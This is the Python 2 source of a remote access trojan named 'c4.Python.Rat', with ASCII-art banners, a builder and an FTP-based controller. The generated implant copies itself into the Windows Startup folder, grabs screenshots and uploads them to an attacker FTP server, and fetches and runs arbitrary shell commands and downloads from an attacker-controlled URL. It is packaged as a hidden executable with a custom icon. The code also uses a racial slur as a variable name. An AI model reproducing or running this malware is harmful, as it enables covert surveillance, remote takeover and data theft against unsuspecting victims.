# C4_PYTHON_RAT

# Made by cr4sh3r



import os, ftplib, time, wget, random
import progressbar
from  distutils.core import setup

lk = 0

art1 = """
              _,     _   _     ,_
          .-'` /     *****     \ `'-.
         /    |      |   |      |    *
        ;      \_  _/     \_  _/      ;
       |         ``         ``         |
       |            cr4sh3r            |
        ;    .-.   .-.   .-.   .-.    ;
         \  (   '.'   \ /   '.'   )  /
          '-.;         V         ;.-'
              `                 `

              c4.Python.Rat"""

art2 = """
      (                      )
      |\    _,--------._    / |
      | `.,'            `. /  |
      `  '   cr4sh3r    ,-'   '
       \/_         _   (     /       I'm watching all
      (,-.`.    ,',-.`. `__,'        this crap you're
       |/#\ ),-','#\`= ,'.` |        doing!
       `._/)  -'.\_,'   ) ))|        HEHEHEHE...
       /  (_.)\     .   -'//
      (  /\____/\    ) )`'*
       \ |V----V||  ' ,    *
        |`- -- -'   ,'   \  \      _____
 ___    |         .'    \ \  `._,-'     `-
    `.__,`---^---'       \ ` -'
       -.______  \ . /  ______,-
             c4.Python.Rat
               `.     ,'
"""


art3= """
        ___               _   _                             _
       /   |             | | | |                           | |
  ___ / /| |  _ __  _   _| |_| |__   ___  _ __    _ __ __ _| |_
 / __/ /_| | | '_ \| | | | __| '_ \ / _ \| '_ \  | '__/ _` | __|
| (__\___  | | |_) | |_| | |_| | | | (_) | | | | | | | (_| | |_
 \___|   |_/ | .__/ \__, |\__|_| |_|\___/|_| |_| |_|  \__,_|\__|
             | |     __/ |
             |_|    |___/               cr4sh3r                   """

art4 = """
                                 o#'9MMHb':'-,o,
                              .oH":HH$' "' ' -*R&o,
                             dMMM*""'`'      .oM"HM?.
                           ,MMM'          "HLbd< ?&H*       HACK THE PLANET!
                          .:MH ."\          ` MM  MM&b      c4.Python.Rat
                         . "*H    -        &MMMMMMMMMH:     CR4SH3R
                         .    dboo        MMMMMMMMMMMM.
                         .   dMMMMMMb      *MMMMMMMMMP.
                         .    MMMMMMMP        *MMMMMP .
                              `#MMMMM           MM6P ,
                          '    `MMMP"           HM*`,
                           '    :MM             .- ,
                            '.   `#?..  .       ..'
                               -.   .         .-
                                 ''-.oo,oo.-''
                                 """


art5 = """
              ____________________________________________________
            /                                                     |
           |    _____________________________________________     |
           | C |                                             |    |
           | R |  C:\> _                                     |    |
           | 4 |                                             |    |
           | S |                                             |    |
           | H |                                             |    |
           | 3 |                                             |    |
           | R |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                    c4.Python.Rat                     |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'"""


art6 = """
  _______________________________
 /\                              *
/++\    __________________________*
\+++\   \ ************************/
 \+++\   \___________________ ***/
  \+++\   \             /+++/***/
   \+++\   \           /+++/***/
    \+++\   \         /+++/***/
     \+++\   \       /+++/***/
      \+++\   \     /+++/***/
       \+++\   \   /+++/***/
        \+++\   \ /+++/***/
         \+++\   /+++/***/
          \+++\ /+++/***/
           \+++++++/***/
            \+++++/***/
             \+++/***/
              \+/___/
         c4.Python.Rat
         CR4SH3R"""




art7 = """
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMds+:--------:+sdNMMMMMMMMMMM
MMMMMMMMms:-+sdNMMMMMMMMNdy+--omMMMMMMMM
MMMMMMh:` /mMMMMMMMMMMMMMMMMm+ `-yMMMMMM
MMMMd--hN``--sNMMMMMMMMMMNy:..`md:.hMMMM
MMM+`yMMMy hd+./hMMMMMMh/.+dd sMMMh`/MMM
MM:.mMMMMM:.NMMh/.+dd+./hMMM--MMMMMm--NM
M+`mMMMMMMN`+MMMMm-  .dMMMMo mMMMMMMN.:M
d yMMMMMMMMy dNy:.omNs--sNm oMMMMMMMMh h
/`MMMMMMMMMM.`.+dMMMMMMm+.``NMMMMMMMMM-:
.:MMMMMMMd+./`oMMMMMMMMMMs /.+dMMMMMMM/`
.:MMMMmo.:yNMs dMMMMMMMMm`oMNy:.omMMMM/`
/`MNy:.omMMMMM--MMMMMMMM:.MMMMMNs--sNM.:
d -` :++++++++: /++++++/ :++++++++:  : h
M+ yddddddddddd+ yddddy /dddddddddddy`/M
MM/.mMMMMMMMMMMM.-MMMM/.NMMMMMMMMMMm.:NM
MMMo`sMMMMMMMMMMd sMMy hMMMMMMMMMMy`+MMM
MMMMd--hMMMMMMMMM+`mN`/MMMMMMMMMh--hMMMM
MMMMMMh:.omMMMMMMN.:/`NMMMMMMms.:hMMMMMM
MMMMMMMMNs:./shmMMh  yMMNds/.:smMMMMMMMM
MMMMMMMMMMMMdy+/---``---:+sdMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
c4.Python.Rat
CR4SH3R"""


art8 = """

               .-''-''-.
              /   '-'  .: __      c4.Python.Rat
      .._    /  /|||||  Y`  `/
     |:  `-.J  /__ __.., )   |
     |  .   ( ( ==|<== : )   |
     :   `.(  )\ _L__ /( )   |
      \    \(  )|\__//(  )   |
       \    \  ):`'':(  /    |
        -_   -.-   .'-'` ` . |
         `. :           .  ' :
          )            :    /
         /    : /   _   :  :
        @)    : |  (@)  | :
         \   /   \     / /
          `i`     `---' /
           |           (
           |           |
          /   )         |
         |               |
         |                |
         \                |
         |    __          |
         |    |#\ /        |
cr4sh3r  |     \#Y         |
         |       |        /"""

art9 = """
                                SPECIAL THANKS TO:
                         | R9, Vini_Nazi, VXHeaven, Pix|
                   _____ | St0rm, Glac, Kr0n0$, Leey   |_____
                         | InurlBrasil, J-Astolfo, Kane|
                   _____ | DoSNUT,Murdok,Booster,Kurono|_____
                         | Jh00n,BakuninM4lvadao, Xandi|
                         """


art10 = """
  _________________________
     ||   ||     ||   ||
     ||   ||, , ,||   ||    TAKE A WRONG STEP AND YOU MAY
     ||  (||/|/(\||/  ||    END UP IN HERE!
     ||  ||| _'_`|||  ||
     ||   || o o ||   ||
     ||  (||  - `||)  ||
     ||   ||  =  ||   ||
     ||   ||\___/||   ||
     ||___||) , (||___||
    /||---||-\_/-||---||
   / ||--_||_____||_--||
  (_(||)-| 1234567 |-(||)_)"""




artfin = random.choice([art1,art2,art3,art4,art5,art6,art7,art8,art9,art10])

print artfin
print " "
print "Version 1.0.0"
print "- - - - - - - - - - - - - - - - - - - - - - - - - - - - -"
print "Made by cr4sh3r"
print "This may be not the final version!"

print "USE ME CORRECTLY! " \
      "ILEGAL ACTIONS HAVE THEIR CONSEQUENCES!"
print "- - - - - - - - - - - - - - - - - - - - - - - - - - - - -"

print "Choose an option:"
print "2 - Builder"
print "1 - Controller"
print "0 - Help"
print "Press E to exit"


def startfun2(n):
    print "Make sure you've got python 2.7 and pyinstaller installed!"
    print "Make sure the pyinstaller dir is C:\Python27\PyInstaller-2.1"
    print "Some extra modules may be required"
    print "- - - - - - - - - - - - "
    print "Made by cr4sh3r"
    print "This may be not the final version!"
    print "- - - - - - - - - - - - "


    raw_input("Press Enter to continue...")
    print "Configure ftp host"
    print "EXAMPLE: ftp.example.com"
    vir_host = raw_input("HOST:")
    print "EXAMPLE: user"
    vir_logi = raw_input("Username:")
    print "EXAMPLE: 1234"
    vir_pasi = raw_input("Password:")
    print "Give me your file a name"
    print "EXAMPLE: test"
    vir_fn = raw_input("File_name:")
    print "Give me your pc id"
    print "EXAMPLE: 01"
    vir_vicid =  raw_input("ID:")
    print "Give me your URL"
    print "EXAMPLE: example.com"
    vir_myurl = raw_input("URL:")
    build = open(vir_fn + ".txt" , 'w')
    finatcomp = vir_fn + ".txt"


    vir_code = '''import os, time, webbrowser, pyHook, pythoncom, sys, logging, wget
import getpass, ctypes, random, inspect, PIL.ImageGrab, ftplib, urllib, urllib2

# START-UP

vir_host = ''' + '\'' + vir_host + '\'' + '''
vir_logi = ''' + '\'' + vir_logi + '\'' + '''
vir_pasi = ''' + '\'' + vir_pasi + '\'' + '''
vir_vicid = ''' + '\'' + vir_vicid + '\'' + '''
vir_myurl = ''' + '\'' + vir_myurl + '\'' + '''

nigga = 0
quest = getpass.getuser()
test = os.getcwd()
filen = '\\\"' + sys.argv[0] + '\\\"'
start =  "\\\"C:\Users" + '\\\\' + quest + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\\\\\""
test2 = os.getcwd()


if test2 == start:
     ctypes.windll.user32.MessageBoxA(0, "ERROR 49, ERROR!", "ERROR!", 1)

else:
     startupcom = "copy " +  filen + " " + start
     os.system(startupcom)
     time.sleep(5)

time.sleep(3)

# What to do?

while nigga <= 1:
    urlupda = "http://" + vir_myurl + "/wtd/" + vir_vicid + "/asno.html"
    f = urllib.urlopen(urlupda)
    updater = f.readline(1)
    time.sleep(05)

    while updater == "1":
        time.sleep(05)
        for updater in range(1):
            updater = f.readline(1)
            time.sleep(5)



    while updater == "2":
                #Screen_log
                bitmap = PIL.ImageGrab.grab()
                start2469 = "C:\Users" + "\\\\" + quest + "\\\\Pictures" + "\\\\" + "2469.jpg"
                bitmap.save(start2469)
                n5 = "2469"
                ftp = ftplib.FTP(vir_host, vir_logi , vir_pasi)
                ftp.cwd('public_html')
                ftp.cwd('images')
                ftp.cwd(vir_vicid)
                filez = open(start2469 , 'rb')
                name6 = str(n5)+".jpg"
                time.sleep(5)
                try:
                    try:
                        f = open(start2469, "rb")
                        name= str(n5)+".jpg"
                        ftp.storbinary('STOR ' + name, f)
                        f.close()
                    finally:
                        ftp.quit()
                except:
                    traceback.print_exc()

                time.sleep(30)
                for updater in range(1):
                    updater = f.readline(1)
                    time.sleep(5)

    while updater == "3":
        #CMD

        for updatz5 in range(1):
            urlup5 = "http://" + vir_myurl + "/cmd/" + vir_vicid + "/aat.js"
            usock = urllib2.urlopen(urlup5)
            updatz5 = usock.read()
            usock.close()
            os.system(updatz5)
            time.sleep(1)

        for updater in range(1):
            updater = f.readline(1)
            time.sleep(5)

    while updater == "4":
        for updat6 in range(1):
            urlup5 = "http://" + vir_myurl + "/dm/" + vir_vicid + "/bling.js"
            usock = urllib2.urlopen(urlup5)
            updat6 = usock.read()
            usock.close()
            ctypes.windll.user32.MessageBoxA(0, updat6 , "ERROR!", 1)
            time.sleep(10)

        for updater in range(1):
            updater = f.readline(1)
            time.sleep(5)

    while updater == "5":
        time.sleep(05)

        for updat6z in range(1):
            urlup5 = "http://" + vir_myurl + "/df/" + vir_vicid + "/blong.js"
            usock = urllib2.urlopen(urlup5)
            updat6z = usock.read()
            usock.close()
            wget.download(updat6z)
            time.sleep(10)


        for updater in range(1):
            updater = f.readline(1)
            time.sleep(5)

    else:
        time.sleep(05)
        for updater in range(1):
            updater = f.readline(1)
            time.sleep(5)


exit()
'''
    build.write(vir_code)
    time.sleep(05)
    finatcomp2 = vir_fn + ".py"
    test2 = os.getcwd()
    build.close()
    os.rename(vir_fn + ".txt", vir_fn + ".py")
    time.sleep(05)

    d5 = "move " + vir_fn + ".py" + " " + "C:\Python27\PyInstaller-2.1"
    print 'Example: C:\Users\\test\\Desktop\kal.ico'
    icn = raw_input("ICON PATH:")
    c6 = "python C:\Python27\PyInstaller-2.1\pyinstaller.py --onefile -w " + "-i " + icn + " C:\Python27\PyInstaller-2.1\\" + vir_fn + ".py"
    e9 = "echo finished"
    bar = progressbar.ProgressBar()
    a = [d5 , c6, e9]
    for b in bar(range(2)):
        time.sleep(03)
        a = [d5 , c6, e9]
        k = b
        j = a[b]
        os.system(j)
        print ""

    time.sleep(05)
    raw_input("...")
    print "Run the RAT as an ADM!"
    print "Only use it with authorization!"
    print "0 - Help"
    raw_input("PRESS ENTER TO CONTINUE...")

    return n

def ftp_con(m):
    print 'Example: ftp.example.com'
    f_host = raw_input("FTP HOST:")
    print "Example: http://www.example.com"
    f_host_url = raw_input("HOST_URL:")
    logi = raw_input("Username:")
    pasi = raw_input("Password:")

    ftp = ftplib.FTP(f_host, logi , pasi)

    print ftp.getwelcome()
    while m <= 1:
        print "LI to list images"
        print "C to acquire CMD control"
        print "DM to display message"
        print "DF to download a file"
        print "CB to control the BOT - Do it first!"
        ftp_com = raw_input(">>>")
        if ftp_com == "LI":
            print "Insert computer ID"
            print "EXAMPLE: 01 "
            vic_id = raw_input(">>>")
            ftp.cwd('public_html')
            ftp.cwd('images')
            ftp.cwd(vic_id)
            print "Images:"
            log = []
            ftp.retrlines('LIST', callback=log.append)
            files = (line.rsplit(None, 1)[1] for line in log)
            files_list = list(files)
            print  files_list
            print "Choose a file to download:"
            fil_down = raw_input(">>>")
            wget.download(f_host_url + "/images" + "/" + vic_id + "/" + fil_down)
            ftp.cwd("../")
            ftp.cwd("../")
            ftp.cwd("../")

        elif ftp_com == "C":
            print "Insert computer ID"
            print "EXAMPLE: 01 "
            vic_id = raw_input(">>>")
            ftp.cwd('public_html')
            ftp.cwd('cmd')
            ftp.cwd(vic_id)
            print "What do you want me to do?"
            print "EXAMPLE: start notepad.exe "
            vic_com = raw_input(">>>")
            aga = open("aat.js" , 'w')
            aga.write(vic_com)
            aga.close()
            ftp.storbinary("STOR aat.js", open("aat.js", "rb"))
            time.sleep(5)
            ftp.cwd("../")
            ftp.cwd("../")
            ftp.cwd("../")

        elif ftp_com == "CB":
            ftp.cwd('public_html')
            ftp.cwd('wtd')
            print "Insert computer ID"
            print "EXAMPLE: 01 "
            vic_id = raw_input(">>>")
            ftp.cwd(vic_id)
            print "What do you want me to do?"
            print "2 - Screenlog"
            print "3 - Cmd_control"
            print "4 - Display message"
            print "5 - Download file"
            bot_com = raw_input(">>>")
            asno = open("asno.html" , 'w')
            asno.write(bot_com)
            asno.close()
            ftp.storbinary("STOR asno.html", open("asno.html" , 'rb'))
            time.sleep(5)
            print "The bot is now executing option " + bot_com
            ftp.cwd("../")
            ftp.cwd("../")
            ftp.cwd("../")

        elif ftp_com == "DM":
            ftp.cwd('public_html')
            ftp.cwd('dm')
            print "Insert computer ID"
            print "EXAMPLE: 01 "
            vic_id = raw_input(">>>")
            ftp.cwd(vic_id)
            print 'Write your message'
            me_com = raw_input('>>>')
            mec = open("bling.js" , 'w')
            mec.write(me_com)
            mec.close()
            ftp.storbinary("STOR bling.js", open("bling.js" , 'rb'))
            time.sleep(5)
            print "The bot is now showing " + me_com
            ftp.cwd("../")
            ftp.cwd("../")
            ftp.cwd("../")

        elif ftp_com == "DF":
            ftp.cwd('public_html')
            ftp.cwd('df')
            print "Insert computer ID"
            print "EXAMPLE: 01 "
            vic_id = raw_input(">>>")
            ftp.cwd(vic_id)
            print 'Tell the bot what to download'
            print 'Ex: http://i.imgur.com/m6a0Vrm.jpg'
            mez_com = raw_input('>>>')
            mez = open("blong.js" , 'w')
            mez.write(mez_com)
            mez.close()
            ftp.storbinary("STOR blong.js", open("blong.js" , 'rb'))
            time.sleep(5)
            print "The bot is now downloading " + mez_com
            ftp.cwd("../")
            ftp.cwd("../")
            ftp.cwd("../")


        else:
            print "ERROR"
            raw_input()


    return m
kfckl = 0

while 1 >= kfckl :

    starter = raw_input(">>>")

    if starter == '1':
        ftp_con(lk)

    elif starter == '2':
        startfun2(lk)

    elif starter == "0":
        print "2 - Builder"
        print "1 - Controller"
        print "0 - Help"
        print "Press E to exit"

    elif starter == "E":
        raw_input("Press ENTER to exit")
        exit()

    else:
        print "Error!"
        print "Press 0 to open the help menu"
        raw_input("...")


# THE END


# Preserve the main author if you're going to change the code








